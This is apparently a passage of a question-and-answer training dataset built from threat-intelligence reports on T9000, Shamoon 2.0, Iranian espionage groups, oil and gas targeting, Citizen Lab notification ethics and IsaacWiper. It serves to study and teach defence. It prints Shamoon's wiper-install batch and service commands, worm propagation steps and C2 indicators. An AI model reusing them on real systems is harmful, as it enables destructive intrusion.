5b90fa081e3ac29a7339995f9b087dab9981409ff62e3215eb558908c6b96b14\nSHA-\u00ad\u2010256 (ResN32.dll): 1cea4e49bd785378d8beb863bb8eb662042dffd18c85b8c14c74a0367071d9a7\nSHA-\u00ad\u2010256 (hccutils.dll): 3dfc94605daf51ebd7bbccbb3a9049999f8d555db0999a6a7e6265a7e458cab9\nSHA-\u00ad\u2010256 (hccutils.inf): f05cd0353817bf6c2cab396181464c31c352d6dea07e2d688def261dd6542b27\nSHA-\u00ad\u2010256 (hjwe.dat): bb73261072d2ef220b8f87c6bb7488ad2da736790898d61f33a5fb7747abf48b\nSHA-\u00ad\u2010256 (qhnj.dat): c61dbc7b51caab1d0353cbba9a8f51f65ef167459277c1c16f15eb6c7025cfe3\nSHA-\u00ad\u2010256 (tyeu.dat): e52b5ed63719a2798314a9c49c42c0ed4eb22a1ac4a2ad30e8bfc899edcea926\nSHA-\u00ad\u2010256 (vnkd.dat): c22b40db7f9f8ebdbde4e5fc3a44e15449f75c40830c88932f9abd541cc78465\nBig Headline: Targeted Exploitation #7: T9000, Chinese Exchange Program Bait File\nThis document\t\n \u00a0exploits CVE-\u00ad\u20102012-\u00ad\u20100158,\t\n \u00a0CVE-\u00ad\u20102012-\u00ad\u20101856 and CVE-\u00ad\u20102015-\u00ad\u20101641 and drops an instance of the T9000 \t\n \u00a0keylogger malware. The bait\t\n \u00a0file for this instance of T9000 involves an exchange program. The Chinese document\t\n \u00a0and a\t\n \u00a0rough English translation are as follows:\nThe bait\t\n  file shows the author of \"HBWBEI\" and last\t\n  modified by \"jack\". Office metadata\t\n  suggests that\t\n  the file was created on March 30 of 2011, and last\t\n  printed on April 3, 2008. We are not\t\n  sure how a\t\n  document\t\n  could be printed before it\t\n  is created. Perhaps the threat\t\n  actors have learned to time travel, or these values are crafted. In any event, the last\t\n  modified date has a\t\n  correspondence with threat\t\n  activity in this case.\nThe T9000 behavior in this sample was different\t\n  from other samples in that\t\n  the Intel folder only contained a\t\n  small amount\t\n  of files, for unknown reasons. In this case, the Intel folder only contains hjwe.dat\t\n  (the \"encrypted core of the malware family\", as discovered by Palo Alto Networks), ~1 (\"debug information about\t\n  files used by malware\") and a\t\n  \"Data\" folder containing dtl.dat\t\n  (encrypted config) and glp.uin (plugin configuration) files. File hash values for these files match what\t\n  was previously documented in targeted exploitation incident\t\n  #5.\nMedium Headline: Connections to Historical and Ongoing Threat Campaign Activity\nObservation of the sample suggests that\t\n \u00a0the C2 is 198.55.120[.]143 on TCP/7386. This IP and port\t\n \u00a0was observed in two other samples in this campaign/engagement. Automated analysis of the configuration itself suggests that\t\n \u00a0the C2 port\t\n \u00a0is TCP/8080 however. Further investigation is required to determine the reason for the discrepancy. Connecting to TCP/8080 of this C2 with a\t\n \u00a0browser results in the download of a\t\n \u00a0file called \"download\" with an MD5 hash of e1269c22ad1e057b9c91523498b4b04d and a\t\n \u00a0SHA-\u00ad\u2010256 hash of b9914fb8c645e0c41d497db303c1ffa594da709686252fccb8d28dffac86275b. This file is delivered to the user after the user presents an HTTP GET. Connecting to this port\t\n \u00a0with telnet\t\n \u00a0and manually issuing a\t\n \u00a0GET results in the delivery of nine bytes from the server. The server then appears to wait\t\n \u00a0for a\t\n \u00a0response. These nine bytes contain the ASCII\t\n \u00a0text\t\n \u00a0\"eueuX_\". There are unprintable characters present\t\n \u00a0however, including 0x05, 0x1b, and 0x12 as seen in this hexdump:\n65 75 65 75 05 1b 12 58 5f |eueu...X_|\nThe same GET connection used on TCP/8080 can also be used on 8088/tcp and 8089/tcp on this particular C2 to obtain the same response consisting of the exact\t\n  same sequence of bytes. It\t\n  is possible that\t\n  this server is configured to support\t\n  multiple campaigns, multiple actor groups, or there may be some other explanation.\nAwareness of this responsive pattern could provide for a\t\n \u00a0potentially useful method to fingerprint\t\n \u00a0a\t\n \u00a0T9000 C2. This communication pattern has been observed in the wild at\t\n \u00a0least\t\n \u00a0as far back as 2014-\u00ad\u201003-\u00ad\u201025\t\n \u00a021:06:19\t\n \u00a0UTC,\t\n \u00a0when someone submitted a\t\n \u00a0sample of this byte sequence to Virus Total (MD5: e1269c22ad1e057b9c91523498b4b04d).\nThis C2 IP address is clearly of interest\t\n \u00a0since it\t\n \u00a0has been used by several samples uncovered in this engagement. Some basic analysis of the C2 reveals the following open ports (filtered ports have been removed from this list). The ports in bold appear to be associated the server-\u00ad\u2010side component\t\n \u00a0of T9000 in this instance:\nConnecting to the Remote Desktop port\t\n  on the server gives us a\t\n  sense of the language in use on the server.\nBig Headline: Targeted Exploitation #8: T9000 \u2013 Tibetan Protester Theme\nThe malicious RTF file, using the name \"One Tibetan Protester is Freed, Two Others Are Jailed.doc\" was first\t\n \u00a0observed in the wild on 2015-\u00ad\u201012-\u00ad\u201031\t\n \u00a005:34:17 and submitted for analysis to Virus Total from India. The RTF document\t\n \u00a0exploits CVE-\u00ad\u20102012-\u00ad\u20100158,\t\n \u00a0CVE-\u00ad\u20102012-\u00ad\u20101856 and CVE-\u00ad\u20102015-\u00ad\u20101641. This document\t\n \u00a0has been determined to drop the T9000 backdoor malware based on the presence of a\t\n \u00a0URL pointing to the previously discovered T9000 C2 string (http://198.55.120[.]143:7386/B/ResN32.dll). The insightful T9000 report\t\n \u00a0from Palo Alto Networks describes this ResN32.dll file as a\t\n \u00a0\"Malicious DLL. Decrypts, decompresses, and loads core malware\".\t\n \u00a0Other obvious strings are present\t\n \u00a0such as the PDB string \"D:\\WORK\\T9000\\N_Inst_User_M1\\Release\\N_Inst_User32.pdb\" and many other clear T9000 artifacts.\nWith regards to the bait\t\n  file \"One Tibetan Protester is Freed, Two Others Are Jailed.doc\", we can see that\t\n  it\t\n  was copied from a\t\n  website. A news item from December 4, 2015 was posted on Radio Free Asia\t\n  [30] using this exact\t\n  Tibetan Protester document\t\n  title. The webpage from Radio Free Asia\t\n  is seen on the left\t\n  below and the bait\t\n  file that\t\n  appears to have been built\t\n  from the website is on the right.\nThe bait\t\n  file document\t\n  metadata\t\n  indicates that\t\n  it\t\n  was created and modified by \"HighSea\" on 12/31/2015, the same day that\t\n  the file was uploaded to Virus Total and the same day other threat\t\n  activity was observed against\t\n  the Tibetan community. The name \"HighSea\" appears in other malicious document\t\n  metadata\t\n  profiled within this report.\n\nIn Targeted Exploitation #8, what specific vulnerabilities are exploited by the malicious RTF file 'One Tibetan Protester is Freed, Two Others Are Jailed.doc', and what indicators confirm the presence of the T9000 backdoor malware? How does the document metadata provide insights into the threat actor's activities?",
    "output": "The malicious RTF file 'One Tibetan Protester is Freed, Two Others Are Jailed.doc' exploits three specific vulnerabilities: CVE-2012-0158, CVE-2012-1856, and CVE-2015-1641. The presence of the T9000 backdoor malware is confirmed by the URL pointing to the previously discovered T9000 C2 string (http://198.55.120[.]143:7386/B/ResN32.dll) and the PDB string 'D:\\WORK\\T9000\\N_Inst_User_M1\\Release\\N_Inst_User32.pdb', among other clear T9000 artifacts. The document metadata indicates that the file was created and modified by 'HighSea' on 12/31/2015, the same day it was uploaded to Virus Total and the same day other threat activity was observed against the Tibetan community. This metadata provides insights into the threat actor's activities, suggesting coordinated efforts targeting specific communities on specific dates.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: 2. Technical details - Shamoon 2.0 - language usage and possible Yemeni links\nSeveral good technical articles on Shamoon 2.0 have been published by some of our colleagues, including , , and others.\nThroughout this blog we describe some of the technical details of the new Shamoon 2.0 attacks and what are the most important things that make them stand out. For the analysis we used the earliest set of samples, with a hardcoded attack date of 17 November 2016. However, we've also included details from the newer samples, such as hardcoded credentials.\nDuring deployment in the victim's environment, the main Shamoon 2.0 wiper module is installed through a Windows Batch file with the following content:\n@echo off\nset u100=ntertmgr32.exe\nset u200=service\nset u800=%~dp0 copy /Y \"%u800%%u100%\" \"%systemroot%\\system32\\%u100%\" start /b %systemroot%\\system32\\%u100% %u200%\nInterestingly, the sample resources appear to have a language ID of \"Arabic (Yemen)\", suggesting the attackers might be from Yemen. Of course, we should not disregard the possibility that the resource language could be a false flag planted there by the attackers.\nMedium Headline: 2.1. 32-bit Shamoon dropper/worm (ntssrvr32.exe)\nThis executable is a worm designed to infect computers connected to a Windows domain. To achieve this, it relies on a list of hardcoded, previously stolen username/password pairs belonging to administrators of the targeted domain. All the strings in the malware are obfuscated with simple one byte ADD operations and are decrypted upon execution. All the dropped files exhibit file times altered to match that of the system's kernel32.dll. The module only works if it is run with exactly one command line parameter, regardless of the parameter. Otherwise, it simply exits (likely a measure to avoid accidental execution).\nSmall Headline: The hardcoded credentials we have observed so far are:\nIf the victim host's system \"PROCESSOR_ARCHITECTURE\" environment variable is \"AMD64\" or \"amd64\", the module installs its 64-bit variant. The variant is contained within a resource\nnamed \"X509\". The resource is de-XORed and dropped onto the system under: <%WindowsDir%\\system32\\ntssrvr64.exe>.\nIt is then installed as a service via the command:\n\"cmd.exe /c \"ping -n 30 127.0.0.1 >nul && sc config NtsSrv binpath= \"C:\\WINDOWS\\system32\\ntssrvr64.exe LocalService\" && ping -n 10 127.0.0.1 >nul && sc start NtsSrv\"\nSmall Headline: 2.1.2. Worm Functionality\nOnce this module runs (as a service), the worm-spreading functionality is started, targeting every network host within the IPv4 address range, with the same first three bytes of the victim's IP and the last byte in the range from 0 to 255, thus operating inside subnet class C (a.b.c.0/24).\nHere's how it works:\n1. The worm connects to a remote machine's registry and disables Remote UAC by setting the LocalAccountTokenFilterPolicy registry key value to 1 in HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies \\system.\n2. If the RemoteRegistry system service is disabled and doesn't run on the target system, the worm reconfigures this service to be auto-started and then starts it immediately. If the connection to a remote registry is unsuccessful, the worm repeats the connection attempt with a hardcoded set of stolen domain administrator credentials. The worm then searches for remote \"\\windows\\system32\\csrss.exe\" files by prepending this path with the victim machine's IP as well as system shares: \"ADMIN$\", \"C$\", \"D$\", \"E$\".\n3. Once a remote system32 folder is found, the worm copies itself into this folder under the name \"ntssrvr32.exe\". It schedules a remote job to run \"ntssrvr32.exe LocalService\" after 90 seconds.\n4. If the remote scheduler is inaccessible, the worm tries to set up NtsSrv and runs the service on the remote machine with the same parameters as it used for self-installation. Attempts with stolen credentials are also performed.\n5. An alternative but similar infection method is coded into the worm, where each infection is performed in a separate thread without relying on the scheduler; but it is not used at this time.\nAnswer this question: In the context of the Shamoon 2.0 attacks, how does the worm functionality operate to spread across a network, and what specific steps does it take to ensure successful propagation?",
    "output": "The worm functionality in Shamoon 2.0 operates by targeting every network host within the IPv4 address range of the victim's subnet class C (a.b.c.0/24). Here\u2019s a step-by-step breakdown of its operation: 1. The worm connects to a remote machine's registry and disables Remote UAC by setting the LocalAccountTokenFilterPolicy registry key value to 1. 2. If the RemoteRegistry system service is disabled, the worm reconfigures it to auto-start and then starts it immediately. If the connection to a remote registry is unsuccessful, the worm uses hardcoded stolen domain administrator credentials to retry the connection. 3. The worm searches for remote '\\\\windows\\\\system32\\\\csrss.exe' files by prepending this path with the victim machine's IP and system shares like 'ADMIN$', 'C$', 'D$', 'E$'. 4. Once a remote system32 folder is found, the worm copies itself into this folder under the name 'ntssrvr32.exe' and schedules a remote job to run 'ntssrvr32.exe LocalService' after 90 seconds. 5. If the remote scheduler is inaccessible, the worm attempts to set up NtsSrv and runs the service on the remote machine using the same parameters as its self-installation, again trying with stolen credentials if necessary.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Two teams of Iran-based attackers have been using back door threats to conduct targeted surveillance of domestic and international targets. While the groups are heavily targeting individuals located in Iran, they've also compromised airlines and telecom providers in the Middle East region, possibly in an attempt to monitor targets' movements and communications.\nThe attackers are part of two separate groups that have a shared interest in targets. One group, which we call Cadelle, uses (<https://www.symantec.com/security_response/writeup.jsp?docid=2015-090808-1754-99>)Backdoor.Cadelspy, while the other, which we've named Chafer, uses and . These threats are capable of opening a back door and stealing information from victims' computers\n\nWhy did the Iran-based attacker groups, Cadelle and Chafer, target both domestic and international entities, including airlines and telecom providers in the Middle East? How does this strategy enhance their surveillance capabilities?",
    "output": "A: The Iran-based attacker groups, Cadelle and Chafer, targeted both domestic and international entities, including airlines and telecom providers in the Middle East, to conduct targeted surveillance. By compromising these organizations, the attackers could potentially monitor the movements and communications of their targets. This strategy enhances their surveillance capabilities by providing access to critical infrastructure that tracks travel patterns and communication data, allowing them to gather comprehensive intelligence on their targets' activities.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Small Headline: THE FUTURE FOR POS ATTACKS\nPoS malware experienced a great deal of success during 2014, however upcoming changes may force changes in payment-processing systems in the U.S. For example, several major credit card companies are expected to institute new policies in October 2015 that will shift liability for fraudulent transactions to whomever\nLooking Forward\nis using the weakest payment-processing systems. The purpose of this is to drive retailers to adopt eMV (europay, MasterCard, and Visa) standards, which entail chip and PIN cards that use a combination of the traditional PIN number and an embedded microchip that encrypts vital information. This type of card offers a more secure payment card solution for consumers.\nAdditionally, several alternative solutions, such as Apple Pay and Google Wallet, have started becoming adopted, allowing for payment via token systems. In theses systems, rather than a card number being transmitted, a one-time token is passed from a consumer's device to the retailer. The advantage to this system is that in the event of the token being obtained by an unauthorized party, it cannot be reused for later transactions.\nAdoption of these newer payment processes should provide consumers with more secure payment methods and make it more difficult for criminals seeking to make money off these systems. There will be some lag time in 2015 as retailers and banks move to put these improvements in place, during which cybercriminals will still be able to exploit the current, antiquated payment processing systems in the U.S. However, the newer processes, once in place, should lead to a decline in the type of PoS attacks seen over the past year.\nDespite this decline, it is almost certain that the implementation of more secure methods will lead cybercriminals to develop more sophisticated means by which to attack payment- processing systems.\nSmall Headline: DESTRUCTIvE AND DISRUPTIvE ATTACKS\nDestructive attacks (such as those carried out by SILeNT CHOLLIMA) and disruptive attacks (such as the DDOS activity against gaming platforms) garnered headlines at the end of 2014. The high-profile nature of these attacks does not necessarily indicate that they will grow in popularity in 2015, however it is\nLooking Forward\npossible that the success of these attacks may encourage other groups to engage in destructive or disruptive operations to advance their interests.\nAs an example of this, a series of disruptive attacks in December targeted online gaming platforms. These attacks manifested in the form of DDOS operations carried out by the LizardSquad group briefly discussed above. The attacks came in two waves, the first of which was in early December when the Xbox Live and PlayStation networks were knocked offline for a short period of time. The second wave of attacks occurred on 25 December 2014 when the Xbox and PlayStation online platforms suffered more outages that LizardSquad claimed responsibility for. CrowdStrike Intelligence is also aware of DDOS threats against other gaming platforms including Valve Software, which appeared to be targeted by a DNS amplification DDOS attack that is similar to previous LizardSquad activity.\nMalicious actors have already engaged in disruptive campaigns in early 2015. Following the January terrorist attacks in France, a group of Islamist hackers known as Fallaga conducted DDOS attacks against servers hosting websites for French foreign embassies. Soon after, another Islamist group identifying with ISIS took control of the Twitter and youTube accounts for U.S. Central Command and posted a number of messages threatening U.S. troops and their families.\nOrganizations in all sectors should be aware of, and prepared for, destructive and disruptive attacks. These operations are often motivated by a specific grievance, but sometimes no clear motivation can be established. Continuous monitoring for publicized threats against an organization, or for potential areas of controversy that could motivate malicious activity, is vital to detect and prepare for these types of attacks.\nBig Headline: Conclusion\nConclusion\nIn the course of reviewing 2014, there were so many interesting events, adversaries, and innovations that selecting examples for this report was an incredible challenge. The CrowdStrike Intelligence team spent much time narrowing the scope of topics covered herein. The adversaries in 2014 proved, if nothing else, to be dynamic, persistent, and innovative. Defenders must be inventive, diligent, and decisive in their efforts to defend the enterprise from these attackers.\n2015 will be a continuation of the cat-and-mouse game that is played between the adversary and the defender. Adversaries across the motivational spectrum will continue to evolve their tactics in order to achieve their objectives. Although tactics may evolve, network defenders will be able to have success against the adversary so long as they are well prepared.\nIntelligence will provide the decisive advantage to both sides, and having a good defense will be predicated on having an informed, intelligent defensive team. The incorporation of intelligence into the daily defense of the enterprise will continue to be paramount and products, services, and solution providers will need to use this intelligence to stay ahead of the adversary.\nAt CrowdStrike, intelligence powers everything we do, and as 2015 unfolds, organizations using intelligence will be better prepared to detect, deter, and defend against their adversaries.\nMedium Headline: CrowDSTrIKe FAlCon intelligenCe\nCrowdStrike Falcon Intelligence portal provides enterprises with strategic, customized, and actionable intelligence. Falcon Intelligence enables organizations to prioritize resources by determining targeted versus commodity attacks, saving time and focusing resources on critical threats. With unprecedented insight into adversary Tactics, Techniques, and Procedures (TTPs) and multi-source information channels, analysts can identify pending attacks and automatically feed threat intelligence via API to SIEM and third-party security tools.\nAccess to CrowdStrike Falcon Intelligence is geared toward all levels of an organization, from the executive who needs to understand the business threat and strategic business impact, to the front-line security professional struggling to fight through an adversary's attack against the enterprise.\nCrowdStrike Falcon Intelligence is a web-based intelligence subscription that includes full access to a variety of feature sets, including:\n\u2022 Detailed technical and strategic analysis of 50+ adversaries' capabilities, indicators and tradecraft, attribution, and intentions\n\u2022 Customizable feeds and API for indicators of compromise in a wide variety of formats\n\u2022 Tailored intelligence that provides visibility into breaking events that matter to an organization's brand, infrastructure, and customers\nLet us show you how CrowdStrike can help you understand your adversary and better protect your network in 2015!\nContact sales@crowdstrike.com to discuss your specific needs. 888-512-8906\nBig Headline: AboUT CrowdStrike\ncrowdstrike\u2122 is a leading provider of next-generation endpoint protection, threat intelligence, and services. CrowdStrike Falcon enables customers to prevent damage from targeted attacks, detect and attribute advanced malware and adversary activity in real time, and effortlessly search all endpoints, reducing overall incident response time.\ncrowdstrike customers include some of the largest blue chip companies in the financial services, energy, oil & gas, telecommunications, retail, and technology sectors, along with some of the largest and most sophisticated government agencies worldwide.\nto learn more, please visit www.crowdstrike.com\n\nQuestion: How might the adoption of eMV standards and token systems impact the landscape of Point-of-Sale (PoS) attacks? Explain the mechanisms behind these systems and their implications for cybersecurity.\n\nAnswer:",
    "output": "The adoption of eMV standards and token systems is expected to significantly enhance the security of payment processing systems. eMV standards involve the use of chip and PIN cards, which combine a traditional PIN number with an embedded microchip that encrypts vital information, providing a more secure payment solution. Token systems, such as those used by Apple Pay and Google Wallet, transmit a one-time token instead of a card number, making it impossible for an unauthorized party to reuse the token for future transactions. These advancements should make it more difficult for cybercriminals to exploit payment systems, potentially leading to a decline in PoS attacks. However, it is anticipated that cybercriminals will develop more sophisticated methods to counter these new security measures.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Significance Going Forward\nThe most important takeaway from these incidents is the significance they hold to the future of the Oil & Gas industry. Inexorably, Oil and Gas is intertwined with the Cyber domain, and will only continue to become more so as the time progresses. The increased reliance on technology means that more and more data and control will be accessible to the attackers in the future. A large contingent of the attacks relied on social engineering and spear phishing as a point of entry, though there is a shift toward \"watering hole\" attacks. This is significant because even as technical controls get better, unwitting employees and their behavior will continue to be a focal point in targeted attacks.\nAutomation via SCADA/ICS has been an integral part of the Oil industry's past and will be even more so in the future. Attacks like the Telvent attack herald an insidious turn of events for SCADA within Oil & Gas. The attackers seemed intent on stealing SCADA software, but it is conceivable that they could have taken such an opportunity to embed their own code within it, providing a capability to manipulate large swaths of North American pipeline at will. This is not meant to be alarmist, but rather considers the next evolution of attack. Leveraging malicious SCADA software to achieve a kinetic outcome is not the baseline going forward, but it is well within the realm of possibility. The nature of a capability like this means that it can only be leveraged to catastrophic effect once, so the possibility of an entity using it outside of sustained or ardent conflict is low. However using this on a micro-scale, and degrading service or quality of service through manipulation of malicious software on the PLCs or HMIs could be more viable in a peacetime setting, and less noticeable. This type of activity could be used at the height of negotiations or disputes to put an adversary in a compromising position, or simply distract them.\nThe Cyber-warfare doctrine of large nation-states like China and Russia that have a huge stake in the Oil & Gas Industries is one of perpetual conflict. Timothy Thomas discusses this in his books Recasting the Red Star and The Dragon's Quantum Leap. The idea of an \"active defense\" and keeping potential competitors \"off balance\" is the posture going forward. The concept of peace being a time without conflict is rapidly disappearing. As globalization has become the status quo and global economies become ever more entangled, threat of a large-scale kinetic confrontation between top tier economic powerhouses is nearly strategically unviable. Instead, both state and non-state actors will use constant conflict in the Cyber realm as a method for accruing resources and exercising control. While cyber conflict often brings to mind the idea of SCADA initiated pipeline explosions, the theft of intellectual property and business communications is far more likely to continue. This type of low intensity conflict is cost-effective and politically sustainable in an environment where direct attribution is at times difficult. The idea of a constant or long term \"ally\" or \"strategic partner\" is no longer valid \u2013 coordination will be largely issue specific, and only to the extent required to achieve an end. While coordinating on one topic nations will be in conflict on another. This is not in any way a revolutionary or new idea; however it is becoming more and more relevant to salient industries operating within their own nation state and abroad as they become far more accessible and targetable in this type of conflict.\nNon-state actors will play a huge role in future cyber conflict within the oil and gas industry. The Norway attack which coincided with a meeting by a state-backed Oil & Gas company may suggest that they already are playing a role. Certainly Antivirus & Incident Response companies are playing a role as non-state actors by releasing these reports. But aside from cooperation with Sate actors, non-state actors may operate independently against other non-state actors in pursuit of competitive advantage or sabotage. Hacker collectives like anonymous could have an out-sized impact if more highly organized, and the attacks they have already carried out could become more severe \u2013 instead of simply releasing email addresses, they could release bid data, or attempt something more destructive akin to a Shamoon type attack.\nThe release of reports on APT is in a way its own form of cyber conflict; the rhetoric of these reports is an information influence operation, both targeted at potential customers and at adversaries. These reports also allow adversaries to see how they were detected and correct mistakes going forward. It is likely that future attacks will lack the types of unprofessional mistakes made during these campaigns. The embedding of personal signatures (a la Ugly Gorilla) or the use of passwords like \"zw.china\" will diminish significantly. If an attacker wished to be more anonymous, it would start to transition to open-source and generic tools exclusively \u2013 tools which are common enough that they do not provide significant attribution. Tools like the Metasploit framework provide a high degree of extensibility without offering a\nsignificant amount in the way of attribution by tool choice. If not a transition like this, then using tools stolen from other attackers or written in other languages would complicate attribution. The move within the Information Technology world toward more forensically resistant technologies such as SSDs and Cloud Service infrastructures which make attribution and legal jurisdiction much more convoluted will continue to be a catalyst for future attacks alongside services already in use like Dynamic DNS.\nThese cyber espionage attacks are likely the newly established baseline for future cyber conflict within the Oil & Gas Industry. Attacks of this nature and magnitude will continue to originate from places which do not have laws against it or are complicit, including China which has a need to secure oil dominance in the future. However, increasing international pressure will necessitate more covert action, with attackers dispersing their operators or proxies throughout large geographic areas. Non-state actors will likely present APT threats in the future, including State-backed and independent competitors.\nQuestion: How does the evolving nature of cyber-attacks, particularly the shift from social engineering to 'watering hole' attacks, impact the future security strategies for the Oil & Gas industry? Why is this shift significant?",
    "output": "Answer: The shift from social engineering and spear phishing to 'watering hole' attacks is significant because it indicates that even as technical controls improve, unwitting employees and their behavior will remain a critical vulnerability. This underscores the importance of continuous employee training and awareness programs. Additionally, it highlights the need for advanced detection mechanisms that can identify and mitigate 'watering hole' attacks, which target commonly visited websites to infect visitors.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nBig Headline: 5.3 Notification\nInvestigations of malware activity, such as that undertaken as part of the Shadow and GhostNet investigations, can yield information about the network infrastructure of the attackers, information about those who have been compromised, and confidential or private documents or other data that may have been exfiltrated without prior knowledge. Access to this information on all levels raises a number of practical, ethical and legal issues, many of which are unclear given the embryonic nature of the field of inquiry as a whole.\nThroughout this investigation, we have been conscious of these issues and have attempted to meet a professional standard in terms of planning and documenting our steps taken in the process of notification. This entailed research into existing practices and principles, and engagement with the law enforcement, intelligence and security communities in a number of countries. We were also conscious of the need to comply with the domestic laws in whose context this investigation was undertaken \u2014 namely those of India, the United States and Canada \u2014 as well as principles governing all academic research at the University of Toronto, where the Citizen Lab is located.\nNotification itself can be broken down into several categories, each of which entails complicating factors. First, there is notification that is required to takedown the command and control infrastructure, typically to the hosting and service provider companies through which the malware networks operate and on which they are hosted. Complicating matters, these services can be located in numerous national jurisdictions and subject to a variety of privacy laws and norms. Second, there are issues around notification of victims, such as governments, businesses, NGOs and individuals. This type of notification is perhaps the most challenging on ethical, practical and legal grounds. Notification of governments, for example, can be a very sensitive matter, especially if classified documents are involved or information is retrieved that is relevant to national security concerns. The same holds true of notification to individuals or businesses. At what point should a researcher notify a victim? Who within the organization, whether it is a government, a business or an NGO, is the appropriate point of contact for the notification? What if the notification jeopardizes a third party's security, or leads to some kind of retaliation or retribution? Should researchers notify law enforcement and intelligence agencies in their own countries before reaching out to foreign governments?\nExisting practices in this area are underdeveloped and largely informal. In part, this reflects the fact that global cyber security is still an embryonic field. But it also speaks to the very real problem of competitive power politics at the highest levels of national security, which tend to restrict information sharing in sensitive areas around cyber crime and espionage. Generally speaking, information sharing among law enforcement and intelligence agencies across borders is tentative at best, with the exception of that which occurs among close allies with deeply entrenched and long-standing links. Outside of those security communities, notification of services and governments tends to be restricted to specialist technical communities, telecommunications operators, and network administrators, if it occurs at all. Consequently, notification of the types referred to above can be ad hoc and inconsistent, largely contingent on the informal connections among professional communities.\nAll of these issues were grappled with in the aftermath of the Tracking GhostNet report, and throughout the course of the Shadow investigation. Our experiences in the aftermath of GhostNet, where notification was left incomplete, prompted a more deliberate and self-conscious approach with the Shadow investigation. We were also fortunate to have within our collaboration the experiences of the Shadowserver Foundation, whose counsel on notification helped in making decisions about timing and contacts.\nBy the end of November 2009, we were confident in our access to the basic command and control infrastructure and identification of some of the key documents at hand. Upon the realization that some information about individual Canadians was compromised, we notified Canadian authorities in December 2009 about the investigation, the compromise of Canadian-related information, and requested assistance on outreach with one of the victims, namely the Indian government. At the same time, we independently explored whom we might contact in the Indian government, including making inquiries with Canada's Department of Foreign Affairs. By February 2010, we were able to find on our own what we thought was an appropriate contact in the Indian government, and gave a detailed notification to the National Technology Research Organization. Our notification for takedown of the command and control infrastructure came later in the investigation, after we had collected and analyzed all of the information related to this report, but prior to its release.\nOur experiences illustrate the intricate, nuanced and often confusing landscape of global cyber security notification practices. The notification process will continue after the publication of this report.\nShadows in the Cloud points to a disturbing complex ecosystem of malware. Although malware networks, cyber crime and espionage have been around for years, the evidence presented here shows how these networks can be aggressively adaptive systems, multipying and regenerating across multiple vectors and platforms, and exploting the vulnerabilties within the latest Web 2.0 technologies to expand their reach and impact. Although there is rich detail to what is uncovered in the Shadow investigation, so much of the origins, architecture and aims of these networks ultimately remain a mystery and await further investigation and analysis. However, even with the partial insights and fleeting glimpses acquired here, we can draw some conclusions and implications for further research, policy and operations.\nFirst, the research here shows, as with Tracking GhostNet, how even a relatively small research sample \u2014 in this case Tibetan organizations \u2014 can expand, upon investigation and analysis, into an astonishingly large pool of victims. The connections drawn out here beg the question of what would emerge if the research began with a different group, from a different region of the world, with a different target set of compromised actors? Clearly, an area of methodological advantage for both the Tracking GhostNet and the Shadows in the Cloud investigations was to have access in the field to compromised computers and be able to work outwards in a structured and systematic fashion, using a combination of technical investigations and data analysis. An area of further research is to extend such efforts to other locations in other regions of the world. Such investigations may reveal other malware networks, or entirely new and unanticipated modes of crime and espionage.\nSecond, Shadows in the Cloud underscores the extent to which the global networked society into which we have evolved socially, politically, economically, and militarily carries with it an underground ecoystem that is equally networked, though far less visible to those whom it compromises. Governments, organizations and other actors around the world have been quick to adopt computerized public and administration systems, including state security actors. Their investments into these technologies have developed at a much faster rate than the appropriate security policies and practices (Deibert and Rohozinski 2010).\nAlthough the Government of India was the most victimized according to what we uncovered in Shadows in the Cloud \u2014 and that certainly should yield a major consideration of public policy and security for that country \u2014 observations about India in this respect need to be qualified in at least two ways. First, Shadows in the Cloud reports only on observations and existing evidence, which by definition remain partial. There could be other countries victimized, involving these very same malware networks attackers, but of which we are unaware because of our limited samples. Second, and most importantly, there are numerous other countries and international organizations that are targeted here, perhaps not to the same extent, but targeted and infiltrated nonetheless. We can only infer what type of data was exfiltrated from these other actors that is of strategic value. Overall, however, the key point to draw is that networked societies can be compromised through networks in which they are invariably linked and mutually dependent.\nThird, and related, Shadows in the Cloud demonstrates clearly the potential for collateral compromise, one of the key hypotheses informing our research framework. This investigation indicates that data leakage from malware networks can compromise unwitting third parties who are not initially targeted by the attackers. Data contained on compromised machines can also contain valuable information on third parties that while on its own may not be significant, but when pieced together with other information can provide actionable and operational intelligence. The policy and operational implications of collateral compromise are serious and wide-ranging, and reinforce that security is only as strong as the weakest link in a chain. In today's networked world, such chains are complex, overlapping and dispersed across numerous technological platforms crossing multiple\nnational jurisdictions. Paying attention to domestic cyber security is therefore only a partial solution to a much wider problem. Today, no country or organization is a secure island in the global sea of information.\n\nWhat challenges did the authors face when notifying governments, businesses, NGOs, and individuals about being compromised by the Shadow APT, and how did they address these challenges?",
    "output": "The authors faced challenges such as the sensitivity of notifying governments about classified documents or national security concerns, identifying the appropriate point of contact within organizations, and the potential for jeopardizing third-party security or causing retaliation. They addressed these challenges by conducting thorough research, seeking counsel from organizations like the Shadowserver Foundation, and making deliberate and self-conscious decisions about timing and contacts.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: IsaacWiper\nIsaacWiper is found in either a Windows DLL or EXE with no Authenticode signature; it appeared in our telemetry on February 24th, 2022. As mentioned earlier, the oldest PE compilation timestamp we have found is October 19th, 2021, meaning that if its PE compilation timestamp was not tampered with, IsaacWiper might have been used in previous operations months earlier.\nFor DLL samples, the name in the PE export directory is Cleaner.dll and it has a single export _Start@4.\nWe have observed IsaacWiper in %programdata% and C:\\Windows\\System32 under the following filenames:\ncl.exe\ncl64.dll cld.dll\ncll.dll\nIt has no code similarity with HermeticWiper and is way less sophisticated. Given the timeline, it is possible that both are related but we haven't found any strong connection yet.\nIsaacWiper starts by enumerating the physical drives and calls DeviceIoControl with the IOCTL IOCTL_STORAGE_GET_DEVICE_NUMBER to get their device numbers. It then wipes the first 0x10000 bytes of each disk using the  pseudorandom generator. The generator is seeded using the GetTickCount value.\nIt then enumerates the logical drives and recursively wipes every file of each disk with random bytes also generated by the ISAAC PRNG. It is interesting to note that it recursively wipes the files in a single thread, meaning that it would take a long time to wipe a large disk.\nOn February 25th, 2022, attackers dropped a new version of IsaacWiper with debug logs. This may indicate that the attackers were unable to wipe some of 